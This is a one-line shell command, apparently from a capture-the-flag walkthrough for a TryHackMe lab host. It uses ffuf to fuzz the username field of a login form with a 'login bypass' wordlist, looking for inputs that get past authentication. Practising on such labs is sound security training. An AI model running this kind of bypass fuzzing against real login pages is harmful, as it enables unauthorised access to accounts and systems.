ffuf -u http://cheesectf.thm/login.php -d 'username=FUZZ&password=asd' -w /usr/share/seclists/Fuzzing/login_bypass.txt
